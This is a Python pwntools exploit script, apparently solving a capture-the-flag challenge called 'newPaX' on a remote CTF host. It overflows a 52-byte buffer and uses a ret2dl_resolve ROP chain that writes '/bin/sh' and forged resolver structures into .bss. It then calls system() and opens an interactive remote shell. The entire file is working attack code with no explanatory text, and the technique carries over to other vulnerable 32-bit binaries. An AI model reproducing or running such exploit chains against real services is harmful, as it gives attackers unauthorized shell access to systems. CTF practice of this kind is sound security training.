import sys
import roputils
from pwn import *

# p = process("./newPaX")
p = remote("newpax.darkarmy.xyz", 5001)

pwn_file = ELF('./newPaX')
offset = 52
readplt = pwn_file.plt['read']
#bss = 0x0804a040
vulFunc = pwn_file.symbols['vuln']

def getReloc(elf, base):
    jmprel = elf.dynamic('JMPREL')
    relent = elf.dynamic('RELENT')
    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)
    reloc_offset = addr_reloc - jmprel
    return reloc_offset

rop = roputils.ROP('./newPaX')
addr_bss = rop.section('.bss')

# step1 : write sh & resolve struct to bss
buf1 = 'A' * offset 
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(52, buf2)
buf2 += rop.dl_resolve_data(addr_bss+52, 'system') 
buf2 += rop.fill(100, buf2)
p.send(buf2)

buf3 = 'A'*52 + rop.dl_resolve_call(addr_bss+52, addr_bss) 
# gdb.attach(p)
p.send(buf3)

p.interactive()

'''
jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relaent = ELF_obj.dynamic_value_by_tag("DT_RELAENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
'''